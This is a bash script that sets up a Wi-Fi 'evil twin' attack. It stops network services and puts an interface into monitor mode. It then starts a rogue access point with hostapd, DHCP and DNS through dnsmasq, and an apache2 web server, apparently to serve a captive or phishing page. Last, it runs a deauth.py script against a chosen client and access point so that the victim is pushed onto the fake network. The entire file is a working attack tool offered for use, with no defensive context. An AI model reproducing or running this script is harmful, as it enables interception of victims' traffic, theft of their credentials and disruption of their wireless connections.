#!/bin/bash

upstream_interface=$1
mac_target=$2
mac_ap=$3
phys_interface=$4


# NetworkManager is a program for providing detection and configuration for systems to automatically connect to networks
# systemd-resolved is a system service that provides network name resolution to local applications.

service network-manager stop
systemctl disable systemd-resolved.service 
systemctl stop systemd-resolved

# Kill the needed process's before it's start again

killall hostapd
killall dnsmasq
killall apache2

# monitor mode allows packets to
# be captured without having to associate with an access point
ifconfig $upstream_interface down
iwconfig $upstream_interface mode monitor 
ifconfig $upstream_interface up

#
rm /etc/resolv.conf
echo nameserver 127.0.0.1 > /etc/resolv.conf

service apache2 start &

xterm -e hostapd Configuration/hostapd.conf &

# Assign the network Gateway and netmask to the interface and add the routing table.

ifconfig $phys_interface 10.0.0.1 netmask 255.255.255.0 & 
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1 &

xterm -e dnsmasq -C Configuration/dnsmasq.conf -d & 

python3 deauth.py $mac_ap $mac_target $upstream_interface &

